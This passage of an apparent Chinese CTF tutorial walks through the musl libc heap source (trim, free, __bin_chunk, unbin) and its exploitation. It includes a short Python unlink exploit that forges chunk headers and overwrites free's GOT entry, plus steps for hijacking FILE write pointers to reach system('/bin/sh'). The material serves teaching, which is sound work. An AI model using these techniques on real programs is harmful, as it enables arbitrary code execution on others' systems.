split;</span><br><span class="line">split-&gt;next-&gt;prev = split;</span><br><span class="line">split-&gt;psize = n | C_INUSE;</span><br><span class="line">split-&gt;csize = n1 - n;</span><br><span class="line">next-&gt;psize = n1 - n;</span><br><span class="line">self-&gt;csize = n | C_INUSE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h3><p>如果从申请的 <code>chunk</code> 切下所需 <code>chunk</code> 后剩余部分还能构成一个 <code>chunk</code> 就切下所需 <code>chunk</code> 并发剩余部分调用 <code>__bin_chunk</code> 函数释放。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">trim</span><span class="params">(<span class="keyword">struct</span> chunk *self, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> n1 = CHUNK_SIZE(self);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n &gt;= n1 - DONTCARE) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    next = NEXT_CHUNK(self);</span><br><span class="line">    split = (<span class="type">void</span> *) ((<span class="type">char</span> *) self + n);</span><br><span class="line"></span><br><span class="line">    split-&gt;psize = n | C_INUSE;</span><br><span class="line">    split-&gt;csize = n1 - n | C_INUSE;</span><br><span class="line">    next-&gt;psize = n1 - n | C_INUSE;</span><br><span class="line">    self-&gt;csize = n | C_INUSE;</span><br><span class="line"></span><br><span class="line">    __bin_chunk(split);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>首先特判传入指针为空的情况。之后判断如果 <code>csize</code> 的 <code>C_INUSE</code> 位为空则通过 <code>psize</code> 找到 mmap 的起始地址 <code>base</code> 和 mmap 的内存长度 <code>len</code> 。之后如果 <code>extra &amp; 1</code> 则终止程序，如果直接 double free 一块非 mmap 的内存就是这个结果。之后调用 <code>__munmap</code> 释放这块内存。如果不是 mmap 得到的 <code>chunk</code> 则调用 <code>__bin_chunk</code> 释放 <code>chunk</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unmap_chunk</span><span class="params">(<span class="keyword">struct</span> chunk *self)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> extra = self-&gt;psize;</span><br><span class="line">    <span class="type">char</span> *base = (<span class="type">char</span> *) self - extra;</span><br><span class="line">    <span class="type">size_t</span> len = CHUNK_SIZE(self) + extra;</span><br><span class="line">    <span class="comment">/* Crash on double free */</span></span><br><span class="line">    <span class="keyword">if</span> (extra &amp; <span class="number">1</span>) a_crash();</span><br><span class="line">    __munmap(base, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">        unmap_chunk(self);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        __bin_chunk(self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="bin-chunk"><a href="#bin-chunk" class="headerlink" title="__bin_chunk"></a>__bin_chunk</h3><p>获取 <code>chunk</code> 的大小并初始化 <code>final_size</code> 和 <code>new_size</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">final_size = new_size = CHUNK_SIZE(self); </span><br></pre></td></tr></table></figure></div>

<p>检测 <code>next-&gt;psize</code> 和 <code>self-&gt;csize</code> 是否相等。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span> =</span> NEXT_CHUNK(self);</span><br><span class="line">...</span><br><span class="line"><span class="comment">/* Crash on corrupted footer (likely from buffer overflow) */</span></span><br><span class="line"><span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br></pre></td></tr></table></figure></div>

<p>将该 <code>chunk</code> 与前后的空闲 <code>chunk</code> 合并直至满足 <code>self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE</code> 条件，即该 <code>chunk</code> 前后都没有空闲 <code>chunk</code> 。<br>期间如果满足 <code>new_size + size &gt; RECLAIM &amp;&amp; (new_size + size ^ size) &gt; size</code> （其中 <code>RECLAIM </code> 为 0x28000）则 <code>reclaim</code> 置 1 ，之后会对释放的 <code>chunk</code> 包含的所有完整物理页调用 <code>madvise</code> 设置 <code>lazyfree</code> 标志，这样在内存紧缺的时候会回收这些物理页。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;</span><br><span class="line">        self-&gt;csize = final_size | C_INUSE;</span><br><span class="line">        next-&gt;psize = final_size | C_INUSE;</span><br><span class="line">        i = bin_index(final_size);</span><br><span class="line">        lock_bin(i);</span><br><span class="line">        lock(mal.free_lock);</span><br><span class="line">        <span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        unlock(mal.free_lock);</span><br><span class="line">        unlock_bin(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (alloc_rev(self)) &#123;</span><br><span class="line">        self = PREV_CHUNK(self);</span><br><span class="line">        size = CHUNK_SIZE(self);</span><br><span class="line">        final_size += size;</span><br><span class="line">        <span class="keyword">if</span> (new_size + size &gt; RECLAIM &amp;&amp; (new_size + size ^ size) &gt; size)</span><br><span class="line">            reclaim = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (alloc_fwd(next)) &#123;</span><br><span class="line">        size = CHUNK_SIZE(next);</span><br><span class="line">        final_size += size;</span><br><span class="line">        <span class="keyword">if</span> (new_size + size &gt; RECLAIM &amp;&amp; (new_size + size ^ size) &gt; size)</span><br><span class="line">            reclaim = <span class="number">1</span>;</span><br><span class="line">        next = NEXT_CHUNK(next);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后更新 <code>binmap</code> 以及 <code>chunk</code> 头部各个字段，然后将 <code>chunk</code> 从对应 <code>bins</code> 的 <code>tail</code> 加入到链表中。最后对于 <code>reclaim</code> 为 1 的情况做相应的处理。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (!(mal.binmap &amp; <span class="number">1ULL</span> &lt;&lt; i))</span><br><span class="line">        a_or_64(&amp;mal.binmap, <span class="number">1ULL</span> &lt;&lt; i);</span><br><span class="line"></span><br><span class="line">    self-&gt;csize = final_size;</span><br><span class="line">    next-&gt;psize = final_size;</span><br><span class="line">    unlock(mal.free_lock);</span><br><span class="line"></span><br><span class="line">    self-&gt;next = BIN_TO_CHUNK(i);</span><br><span class="line">    self-&gt;prev = mal.bins[i].tail;</span><br><span class="line">    self-&gt;next-&gt;prev = self;</span><br><span class="line">    self-&gt;prev-&gt;next = self;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Replace middle of large chunks with fresh zero pages */</span></span><br><span class="line">    <span class="keyword">if</span> (reclaim) &#123;</span><br><span class="line">        <span class="type">uintptr_t</span> a = (<span class="type">uintptr_t</span>) self + SIZE_ALIGN + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line">        <span class="type">uintptr_t</span> b = (<span class="type">uintptr_t</span>) next - SIZE_ALIGN &amp; -PAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line">        __madvise((<span class="type">void</span> *) a, b - a, MADV_DONTNEED);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        __mmap((<span class="type">void</span> *)a, b-a, PROT_READ|PROT_WRITE,</span><br><span class="line">            MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unlock_bin(i);</span><br></pre></td></tr></table></figure></div>

<h2 id="堆利用"><a href="#堆利用" class="headerlink" title="堆利用"></a>堆利用</h2><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>musl 采用 <code>unbin</code> 函数从 <code>bins</code> 中取出 <code>chunk</code> ，对应 glibc 中的 <code>unlink</code> ，但是 <code>unbin</code> 中检查不足没有检查链表完整性，可以进行利用实现任意地址写。如果泄露了堆地址还可以写 rop 链进行 ROP 。<strong>unlink 的作用是可以在两位置写入可读写地址，很多攻击手法都是建立在 unlink 的基础上的。</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unbin</span><span class="params">(<span class="keyword">struct</span> chunk *c, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">        a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span> &lt;&lt; i));</span><br><span class="line">    c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">    c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    c-&gt;csize |= C_INUSE;</span><br><span class="line">    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_musl%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/a8db69d1ca1fe564c331a93f283ffa4b.png"
                     
                ></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">unlink</span>():</span><br><span class="line">    heap_arr = <span class="number">0x4120A0</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x20</span>)  <span class="comment"># chunk0</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x20</span>)  <span class="comment"># chunk1</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x2c</span>, flat([<span class="string">b&#x27;\x00\x00\x00\x01&#x27;</span>, p32(<span class="number">0x28</span>), <span class="comment"># psize-&gt;C_INUSE=1 csize-&gt;C_INUSE=0</span></span><br><span class="line">                        heap_arr+<span class="number">0x10</span>, heap_arr+<span class="number">0x10</span>, </span><br><span class="line">                        <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>, <span class="string">b&#x27;\x00\x00\x00\x28&#x27;</span>])) <span class="comment"># next-&gt;next-&gt;psize==curr-&gt;csize</span></span><br><span class="line">    </span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">6</span>, <span class="number">0x4</span>, p32(<span class="number">0x412024</span>)) <span class="comment"># free_got</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="number">0x4</span>, p32(<span class="number">0x4007F0</span>)) <span class="comment"># back_door</span></span><br><span class="line">    cmd(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&quot;Enter index to free:\n&quot;</span>)</span><br><span class="line">    sl(<span class="string">&quot;0&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>这个 poc 是通过 <code>chunk</code> 合并来触发的 unlink ，因此需要满足以下条件：</p>
<ul>
<li>为了 <code>free</code> 函数能够调用 <code>__bin_chunk</code> 需要 <code>next_chunk</code> 的 <code>csize</code> 的 <code>C_INUSE</code> 位置 1 。</li>
<li>为了绕过 <code>if (next-&gt;psize != self-&gt;csize) a_crash();</code> 检测需要伪造 <code>next_chunk</code> 的 <code>csize</code> 和 <code>next_chunk</code> 的下一个 <code>chunk</code> 的 <code>psize</code>。</li>
<li>为了使 <code>alloc_rev</code> 调用 <code>unbin</code> 函数将 <code>fake_chunk</code> 解链，满足 <code>next_chunk-&gt;psize</code> 的 <code>C_INUSE</code> 位不置位。</li>
</ul>
<h2 id="IO-FILE-利用"><a href="#IO-FILE-利用" class="headerlink" title="IO_FILE 利用"></a>IO_FILE 利用</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((<span class="title">aligned</span>(8))) _<span class="title">IO_FILE</span> // <span class="title">sizeof</span>=</span><span class="number">0x90</span></span><br><span class="line"><span class="number">00000000</span> &#123;                                       <span class="comment">// XREF: FILE/r</span></span><br><span class="line"><span class="number">00000000</span>     <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="number">00000004</span>     <span class="type">unsigned</span> __int8 *rpos;              <span class="comment">// XREF: strtoull+48/w</span></span><br><span class="line"><span class="number">00000004</span>                                         <span class="comment">// strtoull+8C/r ...</span></span><br><span class="line"><span class="number">00000008</span>     <span class="type">unsigned</span> __int8 *rend;              <span class="comment">// XREF: strtoull+44/w</span></span><br><span class="line"><span class="number">00000008</span>                                         <span class="comment">// strtoll+44/w ...</span></span><br><span class="line"><span class="number">0000000</span>C     <span class="title function_">int</span> <span class="params">(*close)</span><span class="params">(FILE *)</span>;</span><br><span class="line"><span class="number">00000010</span>     <span class="type">unsigned</span> __int8 *wend;</span><br><span class="line"><span class="number">00000014</span>     <span class="type">unsigned</span> __int8 *wpos;</span><br><span class="line"><span class="number">00000018</span>     <span class="type">unsigned</span> __int8 *mustbezero_1;</span><br><span class="line"><span class="number">0000001</span>C     <span class="type">unsigned</span> __int8 *wbase;</span><br><span class="line"><span class="number">00000020</span>     <span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> __int8 *, <span class="type">size_t</span>);</span><br><span class="line"><span class="number">00000024</span>     <span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> __int8 *, <span class="type">size_t</span>);</span><br><span class="line"><span class="number">00000028</span>     <span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="number">0000002</span>C     <span class="type">unsigned</span> __int8 *buf;               <span class="comment">// XREF: strtoull+4C/w</span></span><br><span class="line"><span class="number">0000002</span>C                                         <span class="comment">// strtoull+88/r ...</span></span><br><span class="line"><span class="number">00000030</span>     <span class="type">size_t</span> buf_size;</span><br><span class="line"><span class="number">00000034</span>     FILE *prev;</span><br><span class="line"><span class="number">00000038</span>     FILE *next;</span><br><span class="line"><span class="number">0000003</span>C     <span class="type">int</span> fd;</span><br><span class="line"><span class="number">00000040</span>     <span class="type">int</span> pipe_pid;</span><br><span class="line"><span class="number">00000044</span>     <span class="type">int</span> lockcount;</span><br><span class="line"><span class="number">00000048</span>     <span class="type">int</span> mode;</span><br><span class="line"><span class="number">0000004</span>C     <span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line"><span class="number">00000050</span>     <span class="type">int</span> lbf;</span><br><span class="line"><span class="number">00000054</span>     <span class="type">void</span> *cookie;</span><br><span class="line"><span class="number">00000058</span>     <span class="type">off_t</span> off;</span><br><span class="line"><span class="number">00000060</span>     <span class="type">char</span> *getln_buf;</span><br><span class="line"><span class="number">00000064</span>     <span class="type">void</span> *mustbezero_2;</span><br><span class="line"><span class="number">00000068</span>     <span class="type">unsigned</span> __int8 *shend;</span><br><span class="line"><span class="number">0000006</span>C     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">0000006</span>D     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">0000006</span>E     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">0000006F</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000070</span>     <span class="type">off_t</span> shlim;</span><br><span class="line"><span class="number">00000078</span>     <span class="type">off_t</span> shcnt;                        <span class="comment">// XREF: strtoull+98/r</span></span><br><span class="line"><span class="number">00000078</span>                                         <span class="comment">// strtoll+98/r ...</span></span><br><span class="line"><span class="number">00000080</span>     FILE *prev_locked;</span><br><span class="line"><span class="number">00000084</span>     FILE *next_locked;</span><br><span class="line"><span class="number">00000088</span>     __locale_struct *locale;</span><br><span class="line"><span class="number">0000008</span>C     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">0000008</span>D     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">0000008</span>E     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">0000008F</span>     <span class="comment">// padding byte</span></span><br><span class="line"><span class="number">00000090</span> &#125;;</span><br></pre></td></tr></table></figure></div>

<h3 id="exit-调用链"><a href="#exit-调用链" class="headerlink" title="exit 调用链"></a>exit 调用链</h3><p>分析 <code>exit</code> 函数的调用链，发现最终会调用</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="keyword">volatile</span> __stdin_used = &amp;__stdin_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stdout_used = &amp;__stdout_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stderr_used = &amp;__stderr_FILE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">    __funcs_on_exit();</span><br><span class="line">    __libc_exit_fini();</span><br><span class="line">    __stdio_exit();</span><br><span class="line">    _Exit(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>) &#123;</span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">for</span> (f = *__ofl_lock(); f; f = f-&gt;next) close_file(f);</span><br><span class="line">    close_file(__stdin_used);</span><br><span class="line">    close_file(__stdout_used);</span><br><span class="line">    close_file(__stderr_used);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">    FFINALLOCK(f);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos - f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到 <code>close_file</code> 中可能会调用三个 FILE 的 <code>write</code> 和 <code>seek</code> 函数指针。我们要修改的也正是这两个指针。在没有沙箱的情况下，只需要将 FILE 结构体开头的几个字节修改为 <code>/bin/sh</code> ，再修改 <code>write</code> 指针的值为 <code>system</code> ，以及修改 <code>f-&gt;wpos</code> 、<code>f-&gt;wbase</code> 中其中之一就可以调用到 <code>system(&quot;/bin/sh&quot;)</code> 。</p>
<p>总结来说，就是在无沙箱时，需要修改 <code>_IO_FILE</code> 结构体的几个地方：</p>
<ul>
<li>起始位置写入 <code>/bin/sh</code></li>
<li><code>f-&gt;wpos</code> 、<code>f-&gt;wbase</code> 中其中之一使得二者不等</li>
<li><code>write</code> 写入 <code>system</code> 函数地址。</li>
<li>最好将 <code>lock</code> 设置为小于 0 避免程序卡死在 <code>__lockfile</code> 函数中。（等于 0 貌似也可以）</li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FFINALLOCK(f);</span><br><span class="line"><span class="comment">//定义:  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FFINALLOCK(f) ((f)-&gt;lock &gt;= 0 ? __lockfile((f)) : 0)</span></span><br><span class="line"><span class="comment">//替换:  </span></span><br><span class="line">((f)-&gt;lock &gt;= <span class="number">0</span> ? __lockfile((f)) : <span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="puts-调用链"><a href="#puts-调用链" class="headerlink" title="puts 调用链"></a>puts 调用链</h3><p> 分析 <code>puts</code> 函数的调用链，发现最终会调用</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">puts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    FLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    r = -(<span class="built_in">fputs</span>(s, <span class="built_in">stdout</span>) &lt; <span class="number">0</span> || putc_unlocked(<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) &lt; <span class="number">0</span>);</span><br><span class="line">    FUNLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> l = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">return</span> (fwrite(s, <span class="number">1</span>, l, f) == l) - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *<span class="keyword">restrict</span> src, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> k, l = size * nmemb;</span><br><span class="line">    <span class="keyword">if</span> (!size) nmemb = <span class="number">0</span>;</span><br><span class="line">    FLOCK(f);</span><br><span class="line">    k = __fwritex(src, l, f);</span><br><span class="line">    FUNLOCK(f);</span><br><span class="line">    <span class="keyword">return</span> k == l ? nmemb : k / size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __towrite(FILE *f) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;flags &amp; F_NOWR) &#123;</span><br><span class="line">        f-&gt;flags |= F_ERR;</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> __fwritex(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">size_t</span> l, FILE *<span class="keyword">restrict</span> f) &#123;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!f-&gt;wend &amp;&amp; __towrite(f)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l &gt; f-&gt;wend - 